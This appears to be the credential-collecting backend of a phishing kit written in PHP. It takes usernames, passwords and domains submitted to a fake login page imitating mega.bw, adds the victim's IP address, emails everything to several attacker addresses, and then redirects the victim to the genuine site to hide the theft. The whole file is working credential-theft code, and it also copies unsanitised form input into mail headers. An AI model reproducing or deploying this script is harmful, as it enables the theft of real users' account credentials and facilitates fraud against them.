   <?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ mega.bw +-----------connect---\n";
$message .= "username: ".$_POST['_user']."\n";
$message .= "password: ".$_POST['_pass']."\n";
$message .= "Domain: ".$_POST['domain']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By EMMA-----------------\n";
$send = "spamtools33@gmail.com,diplomaticdeliveryman@hotmail.com,obinnaemma499@yahoo.com";
$subject = "mega.bw";
$headers = "From: obinna<logs@www.mega.bw>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: http://www.mega.bw/");
	  

?>